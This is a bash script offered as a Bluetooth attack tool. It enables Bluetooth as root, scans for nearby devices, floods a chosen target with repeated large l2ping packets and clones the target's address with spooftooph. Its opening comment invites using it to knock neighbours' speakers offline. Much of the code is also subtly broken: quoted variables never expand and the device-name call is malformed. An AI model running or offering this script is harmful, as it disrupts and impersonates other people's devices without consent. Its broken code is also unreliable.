#!/bin/bash

# This tool is for educational purpose only and you can us it in bad purposes such as disconnecting your loud neigbors to their bluetooth speaker but im not liable for any damage that can cause by this tool!!!
# Coded: Jayson Cabrillas San Buenaventura
# Github: https://github.com/mkdirlove
# i <3 open source;

##############################################################################################
##############################################################################################

# My fancy banner.
function banner() {
    clear
    echo ""
    echo -e " \e[34m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@     \e[91m┏┓ ╻  ╻ ╻┏━╸╺┳╸┏━┓┏━┓╺┳╸╻ ╻"
    echo -e " \e[34m@@@@\e[34m##########\e[37m@@\e[34m###########@@@     \e[91m┣┻┓┃  ┃ ┃┣╸  ┃ ┃ ┃┃ ┃ ┃ ┣━┫"
    echo -e " \e[34m@@@\e[34m###########\e[37m@@@@@\e[34m#########@@     \e[91m┗━┛┗━╸┗━┛┗━╸ ╹ ┗━┛┗━┛ ╹ ╹ ╹"
    echo -e " \e[34m@@\e[34m############\e[37m@@@@@@@\e[34m########@"
    echo -e " \e[34m@\e[34m######\e[37m@@@\e[34m####\e[37m@@@\e[34m##\e[37m@@@@@\e[34m#####@     \e[91m┏━╸┏━┓┏┓╻┏┓╻┏━╸┏━╸╺┳╸╻┏━┓┏┓╻"
    echo -e " \e[34m@\e[34m#######\e[37m@@@@\e[34m##\e[37m@@@\e[34m##\e[37m@@@@\e[34m######@     \e[91m┃  ┃ ┃┃┗┫┃┗┫┣╸ ┃   ┃ ┃┃ ┃┃┗┫"
    echo -e " \e[34m@\e[34m#########\e[37m@@@@@@@@@@@\e[34m########@     \e[91m┗━╸┗━┛╹ ╹╹ ╹┗━╸┗━╸ ╹ ╹┗━┛╹ ╹"
    echo -e " \e[34m@\e[34m############\e[37m@@@@@\e[34m###########@"
    echo -e " \e[34m@\e[34m###########\e[37m@@@@@@@@\e[34m#########@      \e[91m┳┓╻ ╻┏┳┓┏━┓╻┏┓╻┏━╸"
    echo -e " \e[34m@\e[34m########\e[37m@@@@\e[34m#\e[37m@@@\e[34m#\e[37m@@@@\e[34m#######@      \e[91m┃┃┃ ┃┃┃┃┣━┛┃┃┗┫┃╺┓"
    echo -e " \e[34m@\e[34m######\e[37m@@@@\e[34m###\e[37m@@@\e[34m###\e[37m@@@@\e[34m#####@     \e[91m╺┻┛┗━┛╹ ╹╹  ╹╹ ╹┗━┛"
    echo -e " \e[34m@\e[34m#######\e[37m@@\e[34m####\e[37m@@@\e[34m#\e[37m@@@@\e[34m#######@"
    echo -e " \e[34m@@\e[34m############\e[37m@@@@@@\e[34m#########@     \e[91m╻ ╻╻ ╻╻  ┏┓╻┏━╸┏━┓┏━┓┏┓ ╻╻  ╻╺┳╸╻ ╻"
    echo -e " \e[34m@@@\e[34m###########\e[37m@@@\e[34m###########@@     \e[91m┃┏┛┃ ┃┃  ┃┗┫┣╸ ┣┳┛┣━┫┣┻┓┃┃  ┃ ┃ ┗┳┛"
    echo -e " \e[34m@@@@@\e[34m#########\e[37m@@\e[34m##########@@@@     \e[91m┗┛ ┗━┛┗━╸╹ ╹┗━╸╹┗╸╹ ╹┗━┛╹┗━╸╹ ╹  ╹"
    echo -e " \e[34m@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
    echo ""
    echo -e "                CODED BY: JAYSON CABRILLAS SAN BUENAVENTURA"
}

##############################################################################################
##############################################################################################

# Check if running as root.
function check_sudo() {
  if [[ "$EUID" -ne 0 ]]; then
    clear
    echo " BT CONNECTION DUMPING" | figlet -f future
    printf "%b\n" "   ERROR!!! This script must be run as root. Use sudo." >&2
    exit 1
  fi
}
##############################################################################################
##############################################################################################

# Start bluetooth service.
function start_service() {
    check_sudo
    sudo lsmod | grep blue &>/dev/null
    systemctl enable bluetooth.service &>/dev/null
    systemctl start bluetooth.service &>/dev/null
    if rfkill unblock bluetooth; then
    sleep 3
    echo -e "\e[91m Bluetooth turned on!!!"
    else 
    echo -e "\e[91m Something went wrong!!!"
    fi
}

##############################################################################################
##############################################################################################

# Show connection status using hcidump.
function ping_hcidumping() {
  banner
  echo ""
  sudo xterm -hold -e 'while [ 1 ]; do hcitool scan; echo "Close this window after scanning..." ;done' &
  read -p " Enter BT address: " bt_add
  read -p " Enter BT interface (hci0): " bt_iface
  sudo xterm -hold -e 'while [ 1 ]; do l2ping -i $bt_iface -s 600 -c 10 $bt_add ; echo "Close this window..."; done' &
  sleep 2
  sudo xterm -hold -e 'while [ 1 ]; do hcidump ;done' &
  read -p $'\033[1;33m Press ENTER to start.\033[0m'
}

##############################################################################################
##############################################################################################

# How to use this tool.
function how_to() {
  banner
  echo ""
  echo " STEP 1 : Scan BT devices and pick one."
  echo " STEP 2 : Put BT device on the input."
  echo " STEP 3 : Get the name of the BT device."
  echo " STEP 4 : Put the BT name in the input."
  echo " STEP 5 : Then attack."
  echo ""
  read -p " Back to main menu(Y/n): " menu
  if [[ $menu == "y" || $menu == "Y" ]]; then
  main
  else
  clear
  exit
  fi
}

##############################################################################################
##############################################################################################

# About me.
function about_me () {
  banner
  echo ""
  echo " NAME: Jayson Cabrillas San Buenaventura"
  echo " AGE: 20"
  echo " HOBBIES: Computer Programming & Hacking"
  echo ""
  read -p " Back to main menu(Y/n): " menu
  if [[ $menu == "y" || $menu == "Y" ]]; then
  main
  else
  clear
  exit
  fi
}
##############################################################################################
##############################################################################################

# Spoof BT address using spooftooph then clone the device BT address.
function spoof_bt() {
  banner
  echo ""
  read -p " Enter BT address: " bt_add
  read -p " Enter BT address: " bt_name
  read -p " Enter BT interface (hci0): " bt_iface
  echo ""
  read -p $'\033[1;33m Press ENTER to start.\033[0m'
  sudo xterm -hold -e 'while [ 1 ]; do hcitool info $bt_add ;done' &
  sudo xterm -hold -e 'while [ 1 ]; do spooftooph -a $bt_add -i $bt_iface ;done' &
  sudo xterm -hold -e 'while [ 1 ]; do hciconfig $bt_iface $bt_name ;done' &
  sudo xterm -hold -e 'while [ 1 ]; do l2ping -i $bt_iface -s 600 -c 10 $bt_add ;done' &
  echo ""
  read -p " Back to main menu(Y/n): " menu
  if [[ $menu == "y" || $menu == "Y" ]]; then
  main
  else
  clear
  exit
  fi
} 

##############################################################################################
##############################################################################################

# Main function.
function main() {
    start_service
    banner
    echo ""
    echo -e " \e[37m[01] Attack BT devices                       [03] About me"
    echo -e " \e[37m[02] How to use                              [00] Exit program"
    echo ""
    echo " ┌─[root@parrot]─[~]"
    read -p " └──╼ # " op
    echo ""
    if [[ $op == "01" || $op == "1" ]]; then
    ping_hcidumping
    spoof_bt
    elif [[ $op == "02" || $op == "2" ]]; then
    how_to
    elif [[ $op == "03" || $op == "3" ]]; then
    about_me
    elif [[ $op == "00" || $op == "0" ]]; then
    clear
    exit
    fi
}

##############################################################################################
##############################################################################################

# Arguments goes here.
main